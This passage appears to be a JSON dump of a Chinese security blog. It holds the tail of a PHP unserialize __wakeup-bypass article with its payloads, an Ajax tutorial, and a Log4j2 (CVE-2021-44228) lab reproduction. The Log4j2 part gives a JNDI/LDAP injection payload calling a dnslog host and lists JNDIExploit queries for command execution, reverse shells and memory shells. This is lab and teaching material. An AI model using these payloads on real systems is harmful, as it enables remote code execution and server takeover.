foreach(get_object_vars($this) as $k =&gt; $v) &#123;                    $this-&gt;$k = null;            &#125;            echo &quot;Waking up...\\n&quot;;        &#125;&#125;$test = $_POST[&#x27;test&#x27;];$test_unser = unserialize($test);?&gt;&lt;/body&gt;&lt;/html&gt;\n由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。\n如果我们使用如下payload\ntest=O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;\n会执行__wakeup()函数，页面上会出现如下输出\n\n如果我们使用如下payload\ntest=O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;\n会执行__wakeup()函数，页面上会出现如下输出\n\n\n这里发现个有趣的事情,echo 不能打印出PHP标识符&lt;?php,因此要url编码一下\nGPT回答:\n在PHP中，&lt;?php 是一个标记（tag），用于指示 PHP 代码的起始点。当使用 echo 函数时，它会将其后的内容作为字符串进行输出。但是，如果你尝试使用 echo 输出 &lt;?php，它将被解释为一个 PHP 的起始标记，而不是普通的字符串。为了在 echo 中输出 &lt;?php 这样的 PHP 标识符，你可以使用转义字符 \\ 来告诉 PHP 解释器不要将其解释为标记，而是作为普通的文本。1.使用htmlspecialchars函数对字符串进行转义：echo htmlspecialchars(&#x27;&lt;?php&#x27;);2.将&lt;?php拆分为两部分并连接起来：echo &#x27;&lt;?&#x27; . &#x27;php&#x27;;\n防御方法：\n1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能\n2.在文件系统函数的参数可控时，对参数进行严格的过滤。\n3.严格检查上传文件的内容，而不是只检查文件头。\n4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。\nPHP手册：https://www.php.net/manual/en/book.stream.php\n","categories":["常见top漏洞"]},{"title":"Ajax详解","url":"/2023/07/27/Ajax%E8%AF%A6%E8%A7%A3/","content":"Ajax详解\n0x01 简介\nAJAX 全称为 Asynchronous JavaScript And XML，就是异步的 JS 和 XML。AJAX是一种用于创建快速动态网页的技术。通过AJAX可以在浏览器中向服务器发送异步请求，Ajax可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式。\n1.1 什么是同步请求？\n同步请求是指当前发出请求后，浏览器什么都不能做，必须得等到请求完成返回数据之后，才会执行后续的代码。相当于生活中的排队，必须等待前一个人完成自己的事物，后一个人才能接着办。也就是说，当JS代码加载到当前AJAX的时候会把页面里所有的代码停止加载，当这个AJAX执行完毕后才会继续运行其他代码。\n1.2 什么是异步请求？\n异步请求就当发出请求的同时，浏览器可以继续做任何事，Ajax发送请求并不会影响页面的加载与用户的操作，相当于是在两条线上，各走各的，互不影响。一般默认值为true。异步请求可以完全不影响用户的体验效果，无论请求的时间长或者短，用户可以专心的操作页面的其他内容，并不会有等待的感觉。\n1.3 XML\nXML是一种可扩展标记语言，被设计用来传输和存储数据。XML和 HTML类似，但XML中没有预定义标签，全都是自定义标签，用来表示一些数据。早期 AJAX 携带的数据类型和返回的数据类型为xml形式，这也是 AJAX 名称的由来。\n尽管 X 在 Ajax 中代表 XML，但由于JSON的许多优势，比如更加轻量以和作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。\n1.4 优缺点\n**优点：**可以无需刷新页面而与服务器端进行通信；允许你根据用户事件来更新部分页面内容。\n**缺点：**没有浏览历史，不能回退；存在跨域问题；SEO（搜索引擎优化）不友好，因为数据是动态创建的，爬虫是爬不到的。\n0x02 ajax请求的基本流程\n要完整实现一个AJAX异步调用和局部刷新,通常需要以下几个步骤:\n\n创建 XMLHttpRequest 请求对象, 即创建一个异步调用对象。（ new XMLHttpRequest() ）\n打开请求地址，指定请求方式**。**（open）\n设置响应HTTP请求状态变化的函数.\n发送HTTP请求。（send）\n监听对应的请求状态的变化。（ readystatechange事件 ）\n读取响应数据，使用 JavaScript 和 DOM 实现局部刷新。\n\n1.创建请求对象\n为了使用 JavaScript 向服务器发送一个 http 请求，你需要一个包含必要函数功能的对象实例。这就是为什么会有 XMLHttpRequest 的原因。这是 IE 浏览器的 ActiveX 对象 XMLHTTP 的前身。随后 Mozilla，Safari 和其他浏览器也都实现了类似的方法，被称为 XMLHttpRequest。同时，微软也实现了 XMLHttpRequest 方法。\nif (window.XMLHttpRequest) &#123; // Mozilla, Safari, IE7+ ...    httpRequest = new XMLHttpRequest();&#125; else if (window.ActiveXObject) &#123; // IE 6 及以下    httpRequest = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;\n2.打开请求地址，指定请求方式\n\nopen() 的第一个参数是 HTTP 请求方法，有 GET，POST，HEAD 以及服务器支持的其他方法，方法一定要是大写字母，否则其他一些浏览器（比如 FireFox）可能无法处理这个请求。\n第二个参数是你要发送的 URL。\n第三个参数是可选的，用于设置请求是否是异步的。如果设为 true (默认值)，即开启异步，JavaScript 就不会在此语句阻塞，使得用户能在服务器还没有响应的情况下与页面进行交互。\n\nhttpRequest.open(&#x27;GET&#x27;, &#x27;http://www.example.org/some.file&#x27;, true);\n3.设置响应HTTP请求状态变化的函数\n如果你使用 POST 请求，那就需要设置请求的 MIME 类型，设置请求头。\nContent-Type:用于设定请求体中参数的类型httpRequest.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);\n4.发送HTTP请求\nsend() 方法的参数可以是任何你想发送给服务器的内容，如果是 POST 请求的话，数据将在请求体中发送到服务端，发送数据应该用服务器可以解析的格式，像查询语句。\nhttpRequest.send( &quot;name=value&amp;anothername=&quot;+encodeURIComponent(myVar)+&quot;&amp;so=on&quot; );\n如果是 GET 请求一般不传输参数\nhttpRequest.send();\n5.监听请求状态的变化\n只要 readyState 属性发生变化，就会调用相应的处理函数。这个回调函数会被用户线程所调用。XMLHttpRequest.onreadystatechange 会在 XMLHttpRequest 的readyState 属性发生改变时触发 readystatechange (en-US) 事件的时候被调用。\nhttpRequest.onreadystatechange = function () &#123;&#125;\n6.读取响应数据，并做相应处理\nhttpRequest.onreadystatechange = function () &#123;    //readyState 是请求对象中的一个属性 4表示成功    //status 是 http 状态码     if (httpRequest.readyState == 4 &amp;&amp; /^2\\d&#123;2&#125;$/.test(httpRequest.status)) &#123;          console.log(httpRequest.status); //状态码          console.log(httpRequest.statusText); //状态字符串          console.log(httpRequest.getAllResponseHeaders()); //所有响应头          console.log(httpRequest.response); //响应体     &#125;&#125;\n0x03 取消请求\n如果该请求已被发出，XMLHttpRequest.abort() 方法将终止该请求。\nhttpRequest.abort()","categories":["常见知识总结"]},{"title":"log4j2远程命令执行漏洞复现（CVE-2021-44228）","url":"/2023/07/29/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"Apache log4j2 远程命令执行漏洞复现\n0x01 前言\nApache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年中漏洞会一直存在。此漏洞影响范围特别广泛，漏洞利用门槛低，危害程度非常大，如果被攻击者恶意利用，危害程度不亚于2017年爆发的“永恒之蓝”漏洞。以下图片来源于网络\n\n\n\n\n\n\n\n0x02 漏洞简介\nApache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。\n\n漏洞编号：CVE-2021-44228\n漏洞等级：紧急\nCVSS评分：10（最高级）\n影响版本：Apache log4j2 2.0 - 2.14.1\n安全版本：Apache log4j-2.15.0-rc2\n\n更多关于此漏洞的详细分析：Log4j高危漏洞！具体原因解析！全网第一\n0x03 影响范围\n该漏洞影响范围极广、危害极大，主要由于该组件应用范围十分广泛，所有使用该组件的所有产品都会受到漏洞影响，因此对其下游造成的软件供应链安全隐患巨大。 目前已知的可能受影响的应用及组件包括但不限于如下：\n\n\n\n组件名称\n版本信息\n\n\n\n\nApache Struts2\n全版本\n\n\nElasticSearch\n5.x，6.x，7.x，8.0.0beta1，8.0.0alpha1和8.0.0alpha2\n\n\nLogstash\n5.0.0至最新\n\n\nApache Flink\n1.11.0-rc1 到 1.14.0\n\n\nApache Druid\n0.7.x以上\n\n\nHadoop Hive\n2.x和3.x\n\n\nApache Log4j SLF4J Binding\n‘2.14.1’, ‘2.14.0’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.1’, ‘2.12.0’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.0’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8’, ‘2.7’, ‘2.6.2’, ‘2.6.1’, ‘2.6’, ‘2.5’, ‘2.4.1’, ‘2.4’, ‘2.3’, ‘2.2’, ‘2.1’, ‘2.0.2’, ‘2.0.1’, ‘2.0’, ‘2.0-rc2’, ‘2.0-rc1’, ‘2.0-beta9’, ‘2.0-beta8’, ‘2.0-beta7’, ‘2.0-beta6’, ‘2.0-beta5’\n\n\nSpring Boot\n‘2.6.1’, ‘2.6.0’, ‘2.5.7’, ‘2.5.6’, ‘2.5.5’, ‘2.5.4’, ‘2.5.3’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.13’, ‘2.4.12’, ‘2.4.11’, ‘2.4.10’, ‘2.4.9’, ‘2.4.8’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.12.RELEASE’, ‘2.3.11.RELEASE’, ‘2.3.10.RELEASE’, ‘2.3.9.RELEASE’, ‘2.3.8.RELEASE’, ‘2.3.7.RELEASE’, ‘2.3.6.RELEASE’, ‘2.3.5.RELEASE’, ‘2.3.4.RELEASE’, ‘2.3.3.RELEASE’, ‘2.3.2.RELEASE’, ‘2.3.1.RELEASE’, ‘2.3.0.RELEASE’, ‘2.2.13.RELEASE’, ‘2.2.12.RELEASE’, ‘2.2.11.RELEASE’, ‘2.2.10.RELEASE’, ‘2.2.9.RELEASE’, ‘2.2.8.RELEASE’, ‘2.2.7.RELEASE’, ‘2.2.6.RELEASE’, ‘2.2.5.RELEASE’, ‘2.2.4.RELEASE’, ‘2.2.3.RELEASE’, ‘2.2.2.RELEASE’, ‘2.2.1.RELEASE’, ‘2.2.0.RELEASE’, ‘2.1.18.RELEASE’, ‘2.1.17.RELEASE’, ‘2.1.16.RELEASE’, ‘2.1.15.RELEASE’, ‘2.1.14.RELEASE’, ‘2.1.13.RELEASE’, ‘2.1.12.RELEASE’, ‘2.1.11.RELEASE’, ‘2.1.10.RELEASE’, ‘2.1.9.RELEASE’, ‘2.1.8.RELEASE’, ‘2.1.7.RELEASE’, ‘2.1.6.RELEASE’, ‘2.1.5.RELEASE’, ‘2.1.4.RELEASE’, ‘2.1.3.RELEASE’, ‘2.1.2.RELEASE’, ‘2.1.1.RELEASE’, ‘2.1.0.RELEASE’, ‘2.0.9.RELEASE’, ‘2.0.8.RELEASE’, ‘2.0.7.RELEASE’, ‘2.0.6.RELEASE’, ‘2.0.5.RELEASE’, ‘2.0.4.RELEASE’, ‘2.0.3.RELEASE’, ‘2.0.2.RELEASE’, ‘2.0.1.RELEASE’, ‘2.0.0.RELEASE’, ‘1.5.22.RELEASE’, ‘1.5.21.RELEASE’, ‘1.5.20.RELEASE’, ‘1.5.19.RELEASE’, ‘1.5.18.RELEASE’, ‘1.5.17.RELEASE’, ‘1.5.16.RELEASE’, ‘1.5.15.RELEASE’, ‘1.5.14.RELEASE’, ‘1.5.13.RELEASE’, ‘1.5.12.RELEASE’, ‘1.5.11.RELEASE’, ‘1.5.10.RELEASE’, ‘1.5.9.RELEASE’, ‘1.5.8.RELEASE’, ‘1.5.7.RELEASE’, ‘1.5.6.RELEASE’, ‘1.5.5.RELEASE’, ‘1.5.4.RELEASE’, ‘1.5.3.RELEASE’, ‘1.5.2.RELEASE’, ‘1.5.1.RELEASE’, ‘1.5.0.RELEASE’, ‘1.4.7.RELEASE’, ‘1.4.6.RELEASE’, ‘1.4.5.RELEASE’, ‘1.4.4.RELEASE’, ‘1.4.3.RELEASE’, ‘1.4.2.RELEASE’, ‘1.4.1.RELEASE’, ‘1.4.0.RELEASE’, ‘1.3.8.RELEASE’, ‘1.3.7.RELEASE’, ‘1.3.6.RELEASE’, ‘1.3.5.RELEASE’, ‘1.3.4.RELEASE’, ‘1.3.3.RELEASE’, ‘1.3.2.RELEASE’, ‘1.3.1.RELEASE’, ‘1.3.0.RELEASE’, ‘1.2.8.RELEASE’, ‘1.2.7.RELEASE’, ‘1.2.6.RELEASE’, ‘1.2.5.RELEASE’, ‘1.2.4.RELEASE’, ‘1.2.3.RELEASE’, ‘1.2.2.RELEASE’, ‘1.2.1.RELEASE’, ‘1.2.0.RELEASE’, ‘1.1.12.RELEASE’, ‘1.1.11.RELEASE’, ‘1.1.10.RELEASE’, ‘1.1.9.RELEASE’, ‘1.1.8.RELEASE’, ‘1.1.7.RELEASE’, ‘1.1.6.RELEASE’, ‘1.1.5.RELEASE’, ‘1.1.4.RELEASE’, ‘1.1.3.RELEASE’, ‘1.1.2.RELEASE’, ‘1.1.1.RELEASE’, ‘1.1.0.RELEASE’, ‘1.0.2.RELEASE’, ‘1.0.1.RELEASE’, ‘1.0.0.RELEASE’\n\n\nCamel :: Core\n‘3.13.0’, ‘3.12.0’, ‘3.11.4’, ‘3.11.3’, ‘3.11.2’, ‘3.11.1’, ‘3.11.0’, ‘3.10.0’, ‘3.9.0’, ‘3.8.0’, ‘3.7.6’, ‘3.7.5’, ‘3.7.4’, ‘3.7.3’, ‘3.7.2’, ‘3.7.1’, ‘3.7.0’, ‘3.6.0’, ‘3.5.0’, ‘3.4.6’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.25.4’, ‘2.25.3’, ‘2.25.2’, ‘2.25.1’, ‘2.25.0’, ‘2.24.3’, ‘2.24.2’, ‘2.24.1’, ‘2.24.0’, ‘2.23.4’, ‘2.23.3’, ‘2.23.2’, ‘2.23.1’, ‘2.23.0’, ‘2.22.5’, ‘2.22.4’, ‘2.22.3’, ‘2.22.2’, ‘2.22.1’, ‘2.22.0’, ‘2.21.5’, ‘2.21.4’, ‘2.21.3’, ‘2.21.2’, ‘2.21.1’, ‘2.21.0’, ‘2.20.4’, ‘2.20.3’, ‘2.20.2’, ‘2.20.1’, ‘2.20.0’, ‘2.19.5’, ‘2.19.4’, ‘2.19.3’, ‘2.19.2’, ‘2.19.1’, ‘2.19.0’, ‘2.18.5’, ‘2.18.4’, ‘2.18.3’, ‘2.18.2’, ‘2.18.1’, ‘2.18.0’, ‘2.17.7’, ‘2.17.6’, ‘2.17.5’, ‘2.17.4’, ‘2.17.3’, ‘2.17.2’, ‘2.17.1’, ‘2.17.0’, ‘2.16.5’, ‘2.16.4’, ‘2.16.3’, ‘2.16.2’, ‘2.16.1’, ‘2.16.0’, ‘2.15.6’, ‘2.15.5’, ‘2.15.4’, ‘2.15.3’, ‘2.15.2’, ‘2.15.1’, ‘2.15.0’, ‘2.14.4’, ‘2.14.3’, ‘2.14.2’, ‘2.14.1’, ‘2.14.0’, ‘2.13.4’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.5’, ‘2.12.4’, ‘2.12.3’, ‘2.12.2’, ‘2.12.1’, ‘2.12.0’, ‘2.11.4’, ‘2.11.3’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.7’, ‘2.10.6’, ‘2.10.5’, ‘2.10.4’, ‘2.10.3’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.8’, ‘2.9.7’, ‘2.9.6’, ‘2.9.5’, ‘2.9.4’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.6’, ‘2.8.5’, ‘2.8.4’, ‘2.8.3’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.0’, ‘2.5.0’, ‘2.4.0’, ‘2.3.0’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.6.4’, ‘1.6.3’, ‘1.6.2’, ‘1.6.1’, ‘1.6.0’, ‘1.5.0’, ‘1.4.0’, ‘1.3.0’, ‘1.2.0’, ‘1.1.0’, ‘1.0.0’, ‘3.0.0-M4’, ‘3.0.0-M3’, ‘3.0.0-M2’, ‘3.0.0-M1’, ‘2.0-M3’, ‘2.0-M2’, ‘2.0-M1’, ‘3.0.0-RC3’, ‘3.0.0-RC2’, ‘3.0.0-RC1’, ‘2.9.0-RC1’\n\n\nJUnit Vintage Engine\n‘5.8.2’, ‘5.8.1’, ‘5.8.0’, ‘5.7.2’, ‘5.7.1’, ‘5.7.0’, ‘5.6.3’, ‘5.6.2’, ‘5.6.1’, ‘5.6.0’, ‘5.5.2’, ‘5.5.1’, ‘5.5.0’, ‘5.4.2’, ‘5.4.1’, ‘5.4.0’, ‘5.3.2’, ‘5.3.1’, ‘5.3.0’, ‘5.2.0’, ‘5.1.1’, ‘5.1.0’, ‘4.12.3’, ‘4.12.2’, ‘4.12.1’, ‘4.12.0’, ‘5.8.0-M1’, ‘5.7.0-M1’, ‘5.6.0-M1’, ‘5.5.0-M1’, ‘5.4.0-M1’, ‘5.3.0-M1’, ‘5.2.0-M1’, ‘5.1.0-M2’, ‘5.1.0-M1’, ‘4.12.0-M6’, ‘4.12.0-M5’, ‘4.12.0-M4’, ‘4.12.0-M3’, ‘4.12.0-M2’, ‘4.12.0-M1’, ‘5.8.0-RC1’, ‘5.7.0-RC1’, ‘5.6.0-RC1’, ‘5.5.0-RC2’, ‘5.5.0-RC1’, ‘5.4.0-RC2’, ‘5.4.0-RC1’, ‘5.3.0-RC1’, ‘5.2.0-RC1’, ‘5.1.0-RC1’, ‘4.12.0-RC3’, ‘4.12.0-RC2’, ‘4.12.0-RC1’\n\n\nJBoss Logging 3\n‘3.4.2.Final’, ‘3.4.1.Final’, ‘3.4.0.Final’, ‘3.3.3.Final’, ‘3.3.2.Final’, ‘3.3.1.Final’, ‘3.3.0.Final’, ‘3.2.1.Final’, ‘3.2.0.Final’, ‘3.1.0.CR2’, ‘3.1.0.CR1’, ‘3.0.0.CR1’, ‘3.3.0.Beta1’, ‘3.2.0.Beta1’, ‘3.1.0.Beta3’, ‘3.1.0.Beta2’, ‘3.1.0.Beta1’, ‘3.0.0.Beta5’, ‘3.0.0.Beta4’, ‘3.0.0.Beta3’, ‘3.0.0.Beta2’, ‘3.0.0.Beta1’\n\n\nHikariCP\n‘5.0.0’, ‘4.0.3’, ‘4.0.2’, ‘4.0.1’, ‘4.0.0’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.1’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.0’, ‘2.7.9’, ‘2.7.8’, ‘2.7.7’, ‘2.7.6’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.1’, ‘2.5.0’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.13’, ‘2.3.12’, ‘2.3.11’, ‘2.3.10’, ‘2.3.9’, ‘2.3.8’, ‘2.3.7’, ‘2.3.6’, ‘2.3.5’, ‘2.3.4’, ‘2.3.3’, ‘2.3.2’, ‘2.3.1’, ‘2.3.0’, ‘2.2.5’, ‘2.2.4’, ‘2.2.3’, ‘2.2.2’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.1’, ‘2.0.0’, ‘1.4.0’, ‘1.3.9’, ‘1.3.8’, ‘1.3.7’, ‘1.3.6’, ‘1.3.5’, ‘1.3.4’, ‘1.3.3’, ‘1.3.2’, ‘1.3.1’, ‘1.3.0’, ‘1.2.9’, ‘1.2.8’, ‘1.2.7’, ‘1.2.6’, ‘1.2.5’, ‘1.2.4’, ‘1.2.3’, ‘1.2.2’, ‘1.2.1’, ‘1.1.9’, ‘1.1.8’, ‘1.1.7’, ‘1.1.6’, ‘1.1.5’, ‘1.1.4’, ‘1.1.3’\n\n\nLogging\n‘1.1.0’, ‘1.0.0’, ‘0.6.0’, ‘0.5.0’, ‘0.4.1’, ‘0.4.0’, ‘0.3.1’, ‘0.3.0’, ‘0.2.6’, ‘0.2.4’, ‘0.2.3’, ‘0.2.2’, ‘0.2.0’, ‘0.1.2’, ‘0.1.1’, ‘0.1.0’, ‘0.5.0-alpha.1’, ‘0.5.0-alpha’\n\n\nJedis\n‘3.7.0’, ‘3.6.3’, ‘3.6.2’, ‘3.6.1’, ‘3.6.0’, ‘3.5.2’, ‘3.5.1’, ‘3.5.0’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.1’, ‘2.3.0’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.5.2’, ‘1.5.1’, ‘1.5.0’, ‘1.4.0’, ‘1.3.1’, ‘1.3.0’, ‘jedis-3.6.2’, ‘3.1.0-m4’, ‘3.1.0-m3’, ‘3.1.0-m2’, ‘3.1.0-m1’, ‘3.0.0-m1’, ‘2.10.0-m1’, ‘3.7.0-RC1’, ‘3.6.0-RC1’, ‘3.1.0-rc2’, ‘3.1.0-rc’, ‘3.0.1-rc1’, ‘3.0.0-rc1’, ‘2.10.0-rc1’, ‘1.5.0-RC2’, ‘1.5.0-RC1’, ‘4.0.0-beta4’, ‘4.0.0-beta3’, ‘4.0.0-beta2’, ‘4.0.0-beta1’\n\n\nWSO2 Carbon Kernel Core\n‘5.2.13’, ‘5.2.8’, ‘5.2.7’, ‘5.2.6’, ‘5.2.5’, ‘5.2.4’, ‘5.2.3’, ‘5.2.2’, ‘5.2.1’, ‘4.6.2’, ‘4.6.1’, ‘4.6.0’, ‘4.5.1’, ‘4.4.37’, ‘4.4.36’, ‘4.4.35’, ‘4.4.34’, ‘4.4.33’, ‘4.4.32’, ‘4.4.31’, ‘4.4.30’, ‘4.4.29’, ‘4.4.28’, ‘4.4.27’, ‘4.4.26’, ‘4.4.25’, ‘4.4.24’, ‘4.4.23’, ‘4.4.22’, ‘4.4.21’, ‘4.4.20’, ‘4.4.19’, ‘4.7.0-m6’, ‘4.7.0-m5’, ‘4.7.0-m4’, ‘4.7.0-m3’, ‘4.7.0-m2’, ‘4.7.0-m1’, ‘4.6.3-m5’, ‘4.6.3-m4’, ‘4.6.3-m3’, ‘4.6.3-m2’, ‘4.6.3-m1’, ‘4.6.2-m9’, ‘4.6.2-m8’, ‘4.6.2-m7’, ‘4.6.2-m6’, ‘4.6.2-m5’, ‘4.6.2-m4’, ‘4.6.2-m3’, ‘4.6.2-m2’, ‘4.6.2-m1’, ‘4.6.1-m8’, ‘4.6.1-m7’, ‘4.6.1-m6’, ‘4.6.1-m5’, ‘4.6.1-m4’, ‘4.6.1-m3’, ‘4.6.1-m2’, ‘4.6.1-m1’, ‘4.6.1-beta2’, ‘4.6.1-beta’, ‘4.6.0-beta2’, ‘4.6.1-alpha3’, ‘4.6.1-alpha2’, ‘4.6.1-alpha’, ‘4.6.0-alpha2’, ‘4.6.0-alpha’\n\n\n\n\n以上应用/组件受影响版本统计数据来自：微步情报局 微步在线研究响应中心\n\n0x04 漏洞演示\n演示靶场采用vulfocus在线平台的log4j2-rce靶场，该靶场漏洞位置存在于/hello路径\n\nvulfocus的log4j2-rce靶场的请求数据包如下：\nGET /hello?payload=111 HTTP/1.1Host: vulfocus.fofa.so:30861Content-Type: application/x-www-form-urlencodedContent-Length: 147\n漏洞验证过程使用dnslog、burpsuite、JNDIExploit以及拥有公网ip的vps的服务器，建议java依赖环境采用jdk8u191以下版本进行复现。\ndnslog：http://www.dnslog.cn/JNDIExploit：https://github.com/feihong-cs/JNDIExploitjdk8：https://www.wmzhe.com/soft-70159.html\n0x05 漏洞检测\n1. dnslog手动验证\n首先在dnslog平台生成一个地址，然后利用该地址构造payload让靶机对dnslog平台发起请求：\n\n传入payload：payload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D --记得url编码\n\n请求成功后，dnslog平台点击 Refresh Record 后会接收靶机的请求，记录了靶机的请求的ip地址以及响应时间\n\n通过上述步骤验证，在演示靶场环境中可以确定漏洞是真实存在的，但在真实环境中只能说初步判断目标是有大概率存在漏洞的，由于真实环境中的一些复杂因素，即使dnslog请求成功了也不能完全保证目标一定存在rce漏洞。\n2.  漏洞利用\n1. JNDIExploit\nJNDIExploit是一款用于 JNDI注入 利用的工具，大量参考/引用了 Rogue JNDI 项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。\n\n下载地址: https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q 提取码: 5686\n\n使用 java -jar JNDIExploit.jar -u 查看支持的 LDAP 格式\nSupported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    